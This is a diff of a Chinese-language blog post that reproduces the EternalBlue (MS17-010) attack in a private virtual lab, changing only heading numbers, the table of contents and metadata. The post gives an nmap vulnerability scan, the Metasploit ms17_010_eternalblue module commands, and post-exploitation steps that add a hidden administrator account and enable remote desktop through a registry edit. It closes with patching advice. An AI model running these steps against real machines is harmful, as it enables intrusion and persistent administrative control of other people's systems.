@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="前言 复现准备 复现过程 后记    前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环">
+<meta name="description" content="前言 复现准备 复现过程 后记    一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚">
 <meta name="keywords" content="Nmap,Metasploit,ms17-010,永恒之蓝,攻击复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ms17-010（永恒之蓝）攻击复现">
 <meta property="og:url" content="https://cjjkkk.github.io/2019/03/16/ms17-010永恒之蓝复现/index.html">
 <meta property="og:site_name" content="Jacky Cheng">
-<meta property="og:description" content="前言 复现准备 复现过程 后记    前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环">
+<meta property="og:description" content="前言 复现准备 复现过程 后记    一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/nmap1.png">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/nmap2.jpg">
@@ -96,10 +96,10 @@
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/mete4.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/rdesktop.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/ms17-010/rdesktop2.jpg">
-<meta property="og:updated_time" content="2019-03-16T09:55:58.879Z">
+<meta property="og:updated_time" content="2019-03-16T09:58:40.929Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ms17-010（永恒之蓝）攻击复现">
-<meta name="twitter:description" content="前言 复现准备 复现过程 后记    前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚拟环">
+<meta name="twitter:description" content="前言 复现准备 复现过程 后记    一.前言2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。本文在虚">
 <meta name="twitter:image" content="https://cjjkkk.github.io/image/ms17-010/nmap1.png">
 
 
@@ -339,20 +339,20 @@
 </ul>
 </blockquote>
 <hr>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。<br>本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。</p>
+<h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p>2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。<br>本文在虚拟环境中，使用Nmap和Metasploit对病毒攻击进行复现，展示其攻击过程，供大家学习和参考。</p>
 <a id="more"></a>
-<h2 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>虚拟环境搭建：VMware Workstation 15 pro</p>
+<h2 id="二-复现准备"><a href="#二-复现准备" class="headerlink" title="二.复现准备"></a>二.复现准备</h2><h3 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h3><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2.漏洞影响"></a>2.漏洞影响</h3><p>目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h3 id="3-复现环境"><a href="#3-复现环境" class="headerlink" title="3.复现环境"></a>3.复现环境</h3><p>虚拟环境搭建：VMware Workstation 15 pro</p>
 <p>网络模式：NAT</p>
 <p>攻击机：kali Linux 2019.1 IP:192.168.28.136</p>
 <p>靶机：Windows 7 ultimate sp1 x64 IP:192.168.28.128</p>
 <p>  <br></p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="使用Nmap对靶机进行扫描"><a href="#使用Nmap对靶机进行扫描" class="headerlink" title="使用Nmap对靶机进行扫描"></a>使用Nmap对靶机进行扫描</h3><h4 id="在本地查找ms17-010漏洞"><a href="#在本地查找ms17-010漏洞" class="headerlink" title="在本地查找ms17-010漏洞"></a>在本地查找ms17-010漏洞</h4><p><img src="\image\ms17-010\nmap1.png" alt="nmap1"></p>
-<h4 id="使用nmap对靶机进行扫描"><a href="#使用nmap对靶机进行扫描" class="headerlink" title="使用nmap对靶机进行扫描"></a>使用nmap对靶机进行扫描</h4><p>使用命令并执行</p>
+<h2 id="三-复现过程"><a href="#三-复现过程" class="headerlink" title="三.复现过程"></a>三.复现过程</h2><h3 id="1-使用Nmap对靶机进行扫描"><a href="#1-使用Nmap对靶机进行扫描" class="headerlink" title="1.使用Nmap对靶机进行扫描"></a>1.使用Nmap对靶机进行扫描</h3><h4 id="1-1-在本地查找ms17-010漏洞"><a href="#1-1-在本地查找ms17-010漏洞" class="headerlink" title="1.1.在本地查找ms17-010漏洞"></a>1.1.在本地查找ms17-010漏洞</h4><p><img src="\image\ms17-010\nmap1.png" alt="nmap1"></p>
+<h4 id="1-2-使用nmap对靶机进行扫描"><a href="#1-2-使用nmap对靶机进行扫描" class="headerlink" title="1.2.使用nmap对靶机进行扫描"></a>1.2.使用nmap对靶机进行扫描</h4><p>使用命令并执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/nmap/scripts<span class="comment"># nmap --script smb-vuln-ms17-010 192.168.28.128</span></span><br></pre></td></tr></table></figure>
 <p><img src="\image\ms17-010\nmap2.jpg" alt="nmap1"></p>
-<h3 id="使用Metasploit对目标进行监听"><a href="#使用Metasploit对目标进行监听" class="headerlink" title="使用Metasploit对目标进行监听"></a>使用Metasploit对目标进行监听</h3><p>输入<code>msfconsole</code>启动Metasploit<br>在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
+<h3 id="2-使用Metasploit对目标进行监听"><a href="#2-使用Metasploit对目标进行监听" class="headerlink" title="2.使用Metasploit对目标进行监听"></a>2.使用Metasploit对目标进行监听</h3><p>输入<code>msfconsole</code>启动Metasploit<br>在Metasploit中，输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
 <p><img src="\image\ms17-010\mete.png" alt="mete"></p>
 <p>输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>执行漏洞<br>输入<code>show options</code>查看当前攻击配置</p>
 <p><img src="\image\ms17-010\mete1.jpg" alt="mete1"></p>
@@ -363,13 +363,13 @@
 <p><img src="\image\ms17-010\mete3.jpg" alt="mete3"></p>
 <p>在命令行中输入<code>whoami</code>查看当前登录用户</p>
 <p><img src="\image\ms17-010\mete4.jpg" alt></p>
-<h3 id="在靶机创建用户并赋予管理员权限"><a href="#在靶机创建用户并赋予管理员权限" class="headerlink" title="在靶机创建用户并赋予管理员权限"></a>在靶机创建用户并赋予管理员权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure>
-<h3 id="开启3389端口并使用远程桌面登录"><a href="#开启3389端口并使用远程桌面登录" class="headerlink" title="开启3389端口并使用远程桌面登录"></a>开启3389端口并使用远程桌面登录</h3><p>在命令行中输入<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>并执行，即可打开3389端口<br>此时我们新建一个终端，输入<code>rdesktop 192.168.28.128</code>登录远程桌面</p>
+<h3 id="3-在靶机创建用户并赋予管理员权限"><a href="#3-在靶机创建用户并赋予管理员权限" class="headerlink" title="3.在靶机创建用户并赋予管理员权限"></a>3.在靶机创建用户并赋予管理员权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure>
+<h3 id="4-开启3389端口并使用远程桌面登录"><a href="#4-开启3389端口并使用远程桌面登录" class="headerlink" title="4.开启3389端口并使用远程桌面登录"></a>4.开启3389端口并使用远程桌面登录</h3><p>在命令行中输入<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code>并执行，即可打开3389端口<br>此时我们新建一个终端，输入<code>rdesktop 192.168.28.128</code>登录远程桌面</p>
 <p><img src="\image\ms17-010\rdesktop.jpg" alt="redesktop"></p>
 <p>此时我们选择其他用户并使用刚才创建的用户登录，稍等便能登录到Windows桌面了</p>
 <p><img src="\image\ms17-010\rdesktop2.jpg" alt="rdesktop2"></p>
 <p>  <br></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。</p>
+<h2 id="四-后记"><a href="#四-后记" class="headerlink" title="四.后记"></a>四.后记</h2><p>以上便是使用ms17-010永恒之蓝漏洞对靶机进行攻击的整个复现过程，由此可见攻击过程并不复杂，只需要简单的步骤即可完成攻击并获得极高的权限。由此我们也可以看到平常在使用计算机的时候要注重安全防护。</p>
 <p>此漏洞应该在系统的自动更新或各电脑管家的更新中会提示修复的，大家可以查看一下自己的系统有没有安装，没有的话一定要安装</p>
 
       
@@ -565,7 +565,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现准备"><span class="nav-number">2.</span> <span class="nav-text">复现准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞影响"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现环境"><span class="nav-number">2.3.</span> <span class="nav-text">复现环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">3.</span> <span class="nav-text">复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Nmap对靶机进行扫描"><span class="nav-number">3.1.</span> <span class="nav-text">使用Nmap对靶机进行扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#在本地查找ms17-010漏洞"><span class="nav-number">3.1.1.</span> <span class="nav-text">在本地查找ms17-010漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用nmap对靶机进行扫描"><span class="nav-number">3.1.2.</span> <span class="nav-text">使用nmap对靶机进行扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Metasploit对目标进行监听"><span class="nav-number">3.2.</span> <span class="nav-text">使用Metasploit对目标进行监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在靶机创建用户并赋予管理员权限"><span class="nav-number">3.3.</span> <span class="nav-text">在靶机创建用户并赋予管理员权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开启3389端口并使用远程桌面登录"><span class="nav-number">3.4.</span> <span class="nav-text">开启3389端口并使用远程桌面登录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一.前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-复现准备"><span class="nav-text">二.复现准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-漏洞描述"><span class="nav-text">1.漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞影响"><span class="nav-text">2.漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-复现环境"><span class="nav-text">3.复现环境</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-复现过程"><span class="nav-text">三.复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-使用Nmap对靶机进行扫描"><span class="nav-text">1.使用Nmap对靶机进行扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-在本地查找ms17-010漏洞"><span class="nav-text">1.1.在本地查找ms17-010漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-使用nmap对靶机进行扫描"><span class="nav-text">1.2.使用nmap对靶机进行扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-使用Metasploit对目标进行监听"><span class="nav-text">2.使用Metasploit对目标进行监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-在靶机创建用户并赋予管理员权限"><span class="nav-text">3.在靶机创建用户并赋予管理员权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-开启3389端口并使用远程桌面登录"><span class="nav-text">4.开启3389端口并使用远程桌面登录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四-后记"><span class="nav-text">四.后记</span></a></li></ol></div>
             
 
           </div>
